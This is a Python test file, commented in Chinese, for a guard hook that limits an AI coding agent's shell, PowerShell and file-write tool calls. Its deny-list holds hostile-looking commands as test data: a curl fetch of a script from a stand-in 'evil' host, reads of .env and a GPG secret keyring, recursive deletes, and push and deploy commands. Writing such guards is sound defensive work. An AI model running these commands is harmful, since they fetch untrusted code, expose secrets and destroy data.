"""`PreToolUse` 的黑白名單（REMOTE-OPS-PLAN §6.4）。

這份檔案守的是**「擋不住」與「擋太多」兩種失敗**：

- 擋不住：`git push`、`rm -rf`、寫 `.env`——遠端沒有人在看，發生了也不會有人
  發現，直到後果出現在別的地方。
- 擋太多：正常的 `git status`、`git commit` 被擋掉的話，每一個 run 都會在那裡
  繞到 max_turns 為止，而帳單照算。

⚠️ PowerShell 形式**一定要有對應案例**：實測 Windows 上模型預設選 PowerShell，
只擋 Bash 時 `echo hi` 直接跑過去。
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

from chatroom_runner.guard import (GuardContext, TOOL_MATCHER, check_command,
                                   check_path, check_tool, split_commands)

HOOK = str(Path(__file__).resolve().parents[1]
           / "chatroom_runner" / "hooks" / "pretooluse.py")


@pytest.fixture
def ctx(tmp_path):
    cwd = tmp_path / "repo"
    cwd.mkdir()
    return GuardContext(cwd=cwd,
                        allowed_branches=["jsai_dev", "feature/*"],
                        allowed_domains=["github.com"],
                        protected_paths=[tmp_path / "runner-state"])


ALLOWED = [
    ("git status --porcelain", "白名單的 git"),
    ("git diff --cached --name-only", "commit 前看 index 是規則要求的動作"),
    ("git log origin/jsai_dev..jsai_dev", "看未推送的 commit"),
    ("git add src/app.ts", "逐檔 add"),
    ('git commit -m "修好了. 09/16"', "簽章照走"),
    ("git checkout -b feature/new-thing", "建立允許樣式的分支"),
    ("git switch jsai_dev", "切回允許分支"),
    ("git stash list", "只讀的 stash"),
    ("git fetch origin", "抓遠端"),
    ("npm test", "跑既有驗證"),
    ("Get-ChildItem src", "PowerShell 的列目錄"),
    ("curl https://github.com/owner/repo", "允許網域"),
    ("echo hi && git status", "多段但每段都合法"),
]

DENIED = [
    ("git push origin jsai_dev", "git_push", "push 是人類的事"),
    ("echo hi && git push", "git_push", "第二段才是 push——只看第一個 token 會放行"),
    ("git reset --hard HEAD~1", "git_not_allowed", "白名單以外的 git"),
    ("git clean -fd", "git_not_allowed", "清工作樹"),
    ("git rebase -i HEAD~3", "git_not_allowed", "改寫歷史"),
    ("git branch -D feature/old", "git_branch_destructive", "刪分支"),
    ("git checkout master", "git_branch_not_allowed", "允許清單外的分支"),
    ("git switch jsai_prod", "git_branch_not_allowed", "正式分支永遠不行"),
    ("git checkout -- src/app.ts", "git_checkout_path", "還原會吃掉未 commit 的修改"),
    ("git commit --no-verify -m x", "bypass_hooks", "繞過 hooks"),
    ("git commit --no-gpg-sign -m x", "bypass_hooks", "繞過簽章"),
    ("rm -rf node_modules", "rm_recursive", "遞迴刪除"),
    ("Remove-Item -Recurse -Force .\\dist", "rm_recursive", "PowerShell 的遞迴刪除"),
    ("npm publish", "npm_publish", "發版"),
    ("az webapp restart -n x", "cloud_cli", "雲端 CLI"),
    ("wrangler deploy", "cloud_cli", "部署"),
    ("gh pr merge 12 --squash", "gh_pr_merge", "合併 PR"),
    ("curl https://evil.example.com/x.sh", "network_domain", "允許網域以外"),
    ("Invoke-WebRequest https://evil.example.com", "network_domain",
     "PowerShell 的下載"),
    ("curl -O somefile", "network_no_url", "看不出目的地"),
    ("cat .env", "path_sensitive", "讀設定檔"),
    ("Get-Content ..\\server\\.env", "path_sensitive", "PowerShell 讀設定檔"),
    ("cat ~/.gnupg/secring.gpg", "path_sensitive_dir", "簽章金鑰"),
]


@pytest.mark.parametrize("command, why", ALLOWED)
def test_allowed_commands(ctx, command, why):
    decision = check_command(command, ctx)
    assert decision.allowed, f"{why}：被擋了（{decision.rule}）"


@pytest.mark.parametrize("command, rule, why", DENIED)
def test_denied_commands(ctx, command, rule, why):
    decision = check_command(command, ctx)
    assert not decision.allowed, f"{why}：沒擋住"
    assert decision.rule == rule
    # 理由要能讓模型知道別再試——實測它會換個工具重來一次然後放棄
    assert "這是系統限制" in decision.reason


def test_matcher_covers_powershell():
    """🚨 少了 PowerShell 這一段，整份黑名單在 Windows 上等於沒有。"""
    assert "PowerShell" in TOOL_MATCHER
    assert "Bash" in TOOL_MATCHER
    for tool in ("Write", "Edit", "MultiEdit", "NotebookEdit"):
        assert tool in TOOL_MATCHER


def test_split_commands_respects_quotes():
    assert split_commands('git commit -m "a && b"') == [
        'git commit -m "a && b"']


def test_write_inside_cwd_is_allowed(ctx):
    assert check_path("src/app.ts", ctx).allowed


def test_write_outside_cwd_is_denied(ctx, tmp_path):
    d = check_path(str(tmp_path / "elsewhere" / "x.ts"), ctx)
    assert not d.allowed and d.rule == "path_outside_cwd"


def test_write_to_runner_own_dir_is_denied(ctx, tmp_path):
    d = check_path(str(tmp_path / "runner-state" / "config.json"), ctx)
    assert not d.allowed and d.rule == "path_protected"


@pytest.mark.parametrize("name", [".env", ".env.local", "key.pem"])
def test_write_sensitive_names_denied(ctx, name):
    d = check_path(name, ctx)
    assert not d.allowed and d.rule == "path_sensitive"


def test_check_tool_routes_by_name(ctx):
    assert not check_tool("Bash", {"command": "git push"}, ctx).allowed
    assert not check_tool("PowerShell", {"command": "git push"}, ctx).allowed
    assert not check_tool("Write", {"file_path": "../outside.txt"},
                          ctx).allowed
    assert check_tool("Read", {"file_path": "../outside.txt"}, ctx).allowed


# ── hook 本體（真的跑一次子進程）────────────────────────────────

def _run_hook(run_dir: Path, payload: dict):
    return subprocess.run(
        [sys.executable, HOOK], input=json.dumps(payload), text=True,
        capture_output=True,
        env={**_base_env(), "CHATROOM_RUNNER_RUN_DIR": str(run_dir)})


def _base_env():
    import os
    return {k: v for k, v in os.environ.items()}


@pytest.fixture
def run_dir(tmp_path, ctx):
    d = tmp_path / "run"
    d.mkdir()
    (d / "guard.json").write_text(json.dumps(ctx.to_dict()), encoding="utf-8")
    return d


def test_hook_allows_and_logs(run_dir):
    proc = _run_hook(run_dir, {"tool_name": "Bash",
                               "tool_input": {"command": "git status"}})
    assert proc.returncode == 0, proc.stderr
    logged = (run_dir / "tool.log").read_text(encoding="utf-8").strip()
    assert "git status" in logged and '"verdict": "allow"' in logged


def test_hook_blocks_with_exit_2(run_dir):
    proc = _run_hook(run_dir, {"tool_name": "Bash",
                               "tool_input": {"command": "git push"}})
    assert proc.returncode == 2
    assert "這是系統限制" in proc.stderr


def test_hook_blocks_everything_once_handoff_flag_is_up(run_dir):
    """context 到頂之後，下一次工具呼叫就是交接的觸發點（§5.4）。"""
    (run_dir / "handoff.flag").write_text("{}", encoding="utf-8")
    proc = _run_hook(run_dir, {"tool_name": "Bash",
                               "tool_input": {"command": "git status"}})
    assert proc.returncode == 2
    assert "請立刻把已做／未做／下一步寫到卡" in proc.stderr


def test_hook_blocks_when_guard_config_is_missing(tmp_path):
    """🚨 讀不到規則時**擋**，不是放行。

    放行的話整個 §6.4 會靜默失效，而那件事在 log 上與「這次沒有違規」
    長得一模一樣。
    """
    empty = tmp_path / "no-guard"
    empty.mkdir()
    proc = _run_hook(empty, {"tool_name": "Bash",
                             "tool_input": {"command": "git status"}})
    assert proc.returncode == 2
    assert "守衛設定讀不到" in proc.stderr
